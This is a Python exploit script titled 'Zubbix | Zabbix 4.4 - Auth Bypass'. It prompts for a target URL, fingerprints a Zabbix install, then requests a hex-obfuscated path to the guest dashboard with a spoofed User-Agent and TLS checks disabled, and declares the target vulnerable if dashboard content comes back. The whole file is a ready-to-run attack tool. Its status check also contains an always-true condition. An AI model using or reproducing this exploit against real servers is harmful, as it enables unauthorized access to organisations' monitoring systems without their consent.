#!/usr/bin/python3
# author: oppsec
# credits: Todor Donev

import requests
import os

from rich import print

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

zabbix_text = "Zabbix SIA"

banner = """[cyan]
    Zubbix | Zabbix 4.4 - Auth Bypass
                  @opps3c[/]
"""

def clear():
    os.system('cls' if os.name == "nt" else "clear")


def main():
    clear()
    print(banner)
    connection_check()


def connection_check():
    target_url = input(str(":: Insert the target URL ~> "))

    try:
        response = requests.get(target_url, verify=False, timeout=5)
        status_code = response.status_code

        if(status_code == 200):
            print(f"\n[green]:: Connected succesfully with {target_url}... | {status_code} [/]")
            version_check(target_url)
        else:
            return print(f"\n[red]:: Connection error with {target_url}... | {status_code} [/]")
    except requests.exceptions.ConnectionError:
        print(f"\n[red]:: Can't connect on {target_url}, please verify the URL. [/]")
    except requests.exceptions.MissingSchema:
        return print("\n[red]:: Invalid URL, please check. [/]")

def version_check(target_url):
    zabbix_path = f"{target_url}/zabbix"

    path_request = requests.get(zabbix_path, verify=False, timeout=5)
    path_content = path_request.text

    if(zabbix_text in path_content):
        print(f"[green]:: Zabbix confirmed [/]")
        exploit(target_url)
    else:
        return print(f"[red]:: Can't detect Zabbix, stopping the exploit... [/]\n")


def exploit(target_url):
    payload = "\x2f\x7a\x61\x62\x62\x69\x78\x2f\x7a\x61\x62\x62\x69\x78\x2e\x70\x68\x70\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x64\x61\x73\x68\x62\x6f\x61\x72\x64\x2e\x76\x69\x65\x77\x26\x64\x61\x73\x68\x62\x6f\x61\x72\x64\x69\x64\x3d\x31"

    dashboard_text = "Global view"

    headers = {
        "User-Agent": "Opera/9.61 (Macintosh; Intel Mac OS X; U; de) Presto/2.1.1",
        "Referer": target_url,
        "Content-Type": "application/x-www-form-urlencoded"
    }

    url_payload = f"{target_url}{payload}"

    try:
        payload_request = requests.get(url_payload, headers=headers, verify=False, timeout=10)
        payload_response = payload_request.status_code
        payload_body = payload_request.text

        if(payload_response == 200 and dashboard_text in payload_body):
            print("\n[green]:: The target is vulnerable, exploit worked.[/]")
            print(f"[green]:: URL: {url_payload}\n")
        elif(payload_response == 301 or 403):
            return print(f"\n[red]:: The target is not vulnerable, sorry. [/]")
        else:
            return print(f"\n[yellow]:: Something weird happend | {payload_response}")
    except requests.exceptions.ConnectionError:
        print(f"[red]:: Connection error on {url_payload} ...")

if __name__ == '__main__':
    main()